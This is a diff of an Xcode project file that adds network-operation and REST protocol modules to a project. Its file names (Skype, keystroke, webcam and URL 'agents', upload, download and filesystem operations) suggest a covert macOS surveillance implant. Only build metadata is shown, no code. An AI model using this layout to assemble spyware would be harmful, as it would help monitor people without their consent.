@@ -32,6 +32,13 @@
 		1A4436590F8CD55400CD910E /* RCSMCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4436580F8CD55400CD910E /* RCSMCommon.m */; };
 		1A508A9D11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A508A9C11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m */; };
 		1A508B0511A6B1F20067BF81 /* Carbon.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A508B0411A6B1F20067BF81 /* Carbon.framework */; };
+		1A65115812DDC99100D4F1AF /* IDNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115712DDC99100D4F1AF /* IDNetworkOperation.m */; };
+		1A65115B12DDC9B500D4F1AF /* ConfNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115A12DDC9B500D4F1AF /* ConfNetworkOperation.m */; };
+		1A65115E12DDC9E200D4F1AF /* DownloadNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115D12DDC9E200D4F1AF /* DownloadNetworkOperation.m */; };
+		1A65116112DDCA1900D4F1AF /* UploadNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116012DDCA1900D4F1AF /* UploadNetworkOperation.m */; };
+		1A65116412DDCA4600D4F1AF /* FSNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116312DDCA4600D4F1AF /* FSNetworkOperation.m */; };
+		1A65116712DDCA5700D4F1AF /* LogNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116612DDCA5700D4F1AF /* LogNetworkOperation.m */; };
+		1A65116A12DDCA6C00D4F1AF /* ByeNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65116912DDCA6C00D4F1AF /* ByeNetworkOperation.m */; };
 		1A68E0BA0FB8838400B17F60 /* RCSMAgentIMSkype.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A68E04F0FB881DD00B17F60 /* RCSMAgentIMSkype.m */; };
 		1A68E1530FB9A3B800B17F60 /* RCSMAgentInputLogger.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A68E1520FB9A3B800B17F60 /* RCSMAgentInputLogger.m */; };
 		1A68E3700FBB1F3200B17F60 /* RCSMAgentURL.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A68E36F0FBB1F3200B17F60 /* RCSMAgentURL.m */; };
@@ -49,6 +56,7 @@
 		1AD1D6C81099EBAF005B548F /* QuartzCore.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AD1D6C71099EBAF005B548F /* QuartzCore.framework */; };
 		1AD4328812A3E3CF00B472C3 /* AddressBook.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AD4328712A3E3CF00B472C3 /* AddressBook.framework */; };
 		1AD53606101067D800AC54D8 /* Security.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AF92CC50F947FEE009ED774 /* Security.framework */; };
+		1ADC5D9612DDBF2100650A1E /* RESTNetworkProtocol.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ADC5D9512DDBF2100650A1E /* RESTNetworkProtocol.m */; };
 		1AF15F1811DC8E0100637F4E /* AppKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AF15F1711DC8E0100637F4E /* AppKit.framework */; };
 		1AF610290FA75A2B003F2C12 /* Cocoa.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1058C7A1FEA54F0111CA2CBB /* Cocoa.framework */; };
 		1AF92CB10F947D53009ED774 /* spref.tiff in Resources */ = {isa = PBXBuildFile; fileRef = 1AF92CB00F947D53009ED774 /* spref.tiff */; };
@@ -125,6 +133,20 @@
 		1A508A9C11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSMutableDictionary+ThreadSafe.m"; path = "Categories/NSMutableDictionary+ThreadSafe.m"; sourceTree = "<group>"; };
 		1A508AD111A692260067BF81 /* RCSMDesktopImage.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSMDesktopImage.h; sourceTree = "<group>"; };
 		1A508B0411A6B1F20067BF81 /* Carbon.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Carbon.framework; path = System/Library/Frameworks/Carbon.framework; sourceTree = SDKROOT; };
+		1A65115612DDC99100D4F1AF /* IDNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = IDNetworkOperation.h; path = Modules/IDNetworkOperation.h; sourceTree = "<group>"; };
+		1A65115712DDC99100D4F1AF /* IDNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = IDNetworkOperation.m; path = Modules/IDNetworkOperation.m; sourceTree = "<group>"; };
+		1A65115912DDC9B500D4F1AF /* ConfNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = ConfNetworkOperation.h; path = Modules/ConfNetworkOperation.h; sourceTree = "<group>"; };
+		1A65115A12DDC9B500D4F1AF /* ConfNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = ConfNetworkOperation.m; path = Modules/ConfNetworkOperation.m; sourceTree = "<group>"; };
+		1A65115C12DDC9E200D4F1AF /* DownloadNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = DownloadNetworkOperation.h; path = Modules/DownloadNetworkOperation.h; sourceTree = "<group>"; };
+		1A65115D12DDC9E200D4F1AF /* DownloadNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = DownloadNetworkOperation.m; path = Modules/DownloadNetworkOperation.m; sourceTree = "<group>"; };
+		1A65115F12DDCA1900D4F1AF /* UploadNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = UploadNetworkOperation.h; path = Modules/UploadNetworkOperation.h; sourceTree = "<group>"; };
+		1A65116012DDCA1900D4F1AF /* UploadNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = UploadNetworkOperation.m; path = Modules/UploadNetworkOperation.m; sourceTree = "<group>"; };
+		1A65116212DDCA4600D4F1AF /* FSNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = FSNetworkOperation.h; path = Modules/FSNetworkOperation.h; sourceTree = "<group>"; };
+		1A65116312DDCA4600D4F1AF /* FSNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = FSNetworkOperation.m; path = Modules/FSNetworkOperation.m; sourceTree = "<group>"; };
+		1A65116512DDCA5700D4F1AF /* LogNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = LogNetworkOperation.h; path = Modules/LogNetworkOperation.h; sourceTree = "<group>"; };
+		1A65116612DDCA5700D4F1AF /* LogNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = LogNetworkOperation.m; path = Modules/LogNetworkOperation.m; sourceTree = "<group>"; };
+		1A65116812DDCA6C00D4F1AF /* ByeNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = ByeNetworkOperation.h; path = Modules/ByeNetworkOperation.h; sourceTree = "<group>"; };
+		1A65116912DDCA6C00D4F1AF /* ByeNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = ByeNetworkOperation.m; path = Modules/ByeNetworkOperation.m; sourceTree = "<group>"; };
 		1A68E04E0FB881DD00B17F60 /* RCSMAgentIMSkype.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentIMSkype.h; path = Agents/RCSMAgentIMSkype.h; sourceTree = "<group>"; };
 		1A68E04F0FB881DD00B17F60 /* RCSMAgentIMSkype.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentIMSkype.m; path = Agents/RCSMAgentIMSkype.m; sourceTree = "<group>"; };
 		1A68E1510FB9A3B800B17F60 /* RCSMAgentInputLogger.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentInputLogger.h; path = Agents/RCSMAgentInputLogger.h; sourceTree = "<group>"; };
@@ -146,6 +168,10 @@
 		1ABEEE2D0F975CE100063113 /* RCSMCore.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RCSMCore.m; sourceTree = "<group>"; };
 		1AD1D6C71099EBAF005B548F /* QuartzCore.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = QuartzCore.framework; path = System/Library/Frameworks/QuartzCore.framework; sourceTree = SDKROOT; };
 		1AD4328712A3E3CF00B472C3 /* AddressBook.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AddressBook.framework; path = System/Library/Frameworks/AddressBook.framework; sourceTree = SDKROOT; };
+		1ADC5D8412DDBEA600650A1E /* NetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = NetworkOperation.h; path = Modules/NetworkOperation.h; sourceTree = "<group>"; };
+		1ADC5D8712DDBEB800650A1E /* NetworkProtocol.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = NetworkProtocol.h; path = Modules/NetworkProtocol.h; sourceTree = "<group>"; };
+		1ADC5D9412DDBF2100650A1E /* RESTNetworkProtocol.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RESTNetworkProtocol.h; path = Modules/RESTNetworkProtocol.h; sourceTree = "<group>"; };
+		1ADC5D9512DDBF2100650A1E /* RESTNetworkProtocol.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RESTNetworkProtocol.m; path = Modules/RESTNetworkProtocol.m; sourceTree = "<group>"; };
 		1AF15F1711DC8E0100637F4E /* AppKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AppKit.framework; path = System/Library/Frameworks/AppKit.framework; sourceTree = SDKROOT; };
 		1AF610090FA72D87003F2C12 /* RCSMInputManager.bundle */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = RCSMInputManager.bundle; sourceTree = BUILT_PRODUCTS_DIR; };
 		1AF6100A0FA72D87003F2C12 /* RCSMInputManager-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "RCSMInputManager-Info.plist"; sourceTree = "<group>"; };
@@ -203,6 +229,7 @@
 			isa = PBXGroup;
 			children = (
 				1AE6B5610F8E2574004736EA /* Agents */,
+				1ADC5D7D12DDBE4E00650A1E /* Network */,
 				1A4434830F8B950B00CD910E /* RCSMConfManager.h */,
 				1A4434840F8B950B00CD910E /* RCSMConfManager.m */,
 				1A4434D50F8C907000CD910E /* RCSMEncryption.h */,
@@ -211,8 +238,6 @@
 				1AF92B710F8F4A90009ED774 /* RCSMTaskManager.m */,
 				1A1B9D6A0FA0B4BB0036558C /* RCSMLogManager.h */,
 				1A1B9D6B0FA0B4BB0036558C /* RCSMLogManager.m */,
-				1A33F3FC0FC696FE00590FA1 /* RCSMCommunicationManager.h */,
-				1A33F3FD0FC696FE00590FA1 /* RCSMCommunicationManager.m */,
 				1A33F8EA0FCC1EB000590FA1 /* RCSMEvents.h */,
 				1A33F8EB0FCC1EB000590FA1 /* RCSMEvents.m */,
 				1A7A94140FE13EC7007FF947 /* RCSMActions.h */,
@@ -339,6 +364,49 @@
 			name = Voip;
 			sourceTree = "<group>";
 		};
+		1ADC5D7D12DDBE4E00650A1E /* Network */ = {
+			isa = PBXGroup;
+			children = (
+				1ADC5D8212DDBE7600650A1E /* Operations */,
+				1ADC5D8312DDBE7B00650A1E /* Protocols */,
+				1A33F3FC0FC696FE00590FA1 /* RCSMCommunicationManager.h */,
+				1A33F3FD0FC696FE00590FA1 /* RCSMCommunicationManager.m */,
+			);
+			name = Network;
+			sourceTree = "<group>";
+		};
+		1ADC5D8212DDBE7600650A1E /* Operations */ = {
+			isa = PBXGroup;
+			children = (
+				1ADC5D8412DDBEA600650A1E /* NetworkOperation.h */,
+				1A65115612DDC99100D4F1AF /* IDNetworkOperation.h */,
+				1A65115712DDC99100D4F1AF /* IDNetworkOperation.m */,
+				1A65115912DDC9B500D4F1AF /* ConfNetworkOperation.h */,
+				1A65115A12DDC9B500D4F1AF /* ConfNetworkOperation.m */,
+				1A65115C12DDC9E200D4F1AF /* DownloadNetworkOperation.h */,
+				1A65115D12DDC9E200D4F1AF /* DownloadNetworkOperation.m */,
+				1A65115F12DDCA1900D4F1AF /* UploadNetworkOperation.h */,
+				1A65116012DDCA1900D4F1AF /* UploadNetworkOperation.m */,
+				1A65116212DDCA4600D4F1AF /* FSNetworkOperation.h */,
+				1A65116312DDCA4600D4F1AF /* FSNetworkOperation.m */,
+				1A65116512DDCA5700D4F1AF /* LogNetworkOperation.h */,
+				1A65116612DDCA5700D4F1AF /* LogNetworkOperation.m */,
+				1A65116812DDCA6C00D4F1AF /* ByeNetworkOperation.h */,
+				1A65116912DDCA6C00D4F1AF /* ByeNetworkOperation.m */,
+			);
+			name = Operations;
+			sourceTree = "<group>";
+		};
+		1ADC5D8312DDBE7B00650A1E /* Protocols */ = {
+			isa = PBXGroup;
+			children = (
+				1ADC5D8712DDBEB800650A1E /* NetworkProtocol.h */,
+				1ADC5D9412DDBF2100650A1E /* RESTNetworkProtocol.h */,
+				1ADC5D9512DDBF2100650A1E /* RESTNetworkProtocol.m */,
+			);
+			name = Protocols;
+			sourceTree = "<group>";
+		};
 		1AE6B5610F8E2574004736EA /* Agents */ = {
 			isa = PBXGroup;
 			children = (
@@ -366,10 +434,10 @@
 		1AF610010FA72D50003F2C12 /* InputManager */ = {
 			isa = PBXGroup;
 			children = (
+				1A68E0230FB87A9300B17F60 /* Agents */,
 				1A319EE30FA9B6410079B060 /* RCSMInputManager.h */,
 				1A319EE40FA9B6410079B060 /* RCSMInputManager.m */,
 				1A319F080FA9C8260079B060 /* Info */,
-				1A68E0230FB87A9300B17F60 /* Agents */,
 			);
 			name = InputManager;
 			sourceTree = "<group>";
@@ -559,6 +627,14 @@
 				1A1A2FD010611067001F1B5D /* RCSMAgentWebcam.m in Sources */,
 				1A508A9D11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m in Sources */,
 				1AB5DC4111CF9DE600B9E32B /* NSApplication+SystemVersion.m in Sources */,
+				1ADC5D9612DDBF2100650A1E /* RESTNetworkProtocol.m in Sources */,
+				1A65115812DDC99100D4F1AF /* IDNetworkOperation.m in Sources */,
+				1A65115B12DDC9B500D4F1AF /* ConfNetworkOperation.m in Sources */,
+				1A65115E12DDC9E200D4F1AF /* DownloadNetworkOperation.m in Sources */,
+				1A65116112DDCA1900D4F1AF /* UploadNetworkOperation.m in Sources */,
+				1A65116412DDCA4600D4F1AF /* FSNetworkOperation.m in Sources */,
+				1A65116712DDCA5700D4F1AF /* LogNetworkOperation.m in Sources */,
+				1A65116A12DDCA6C00D4F1AF /* ByeNetworkOperation.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
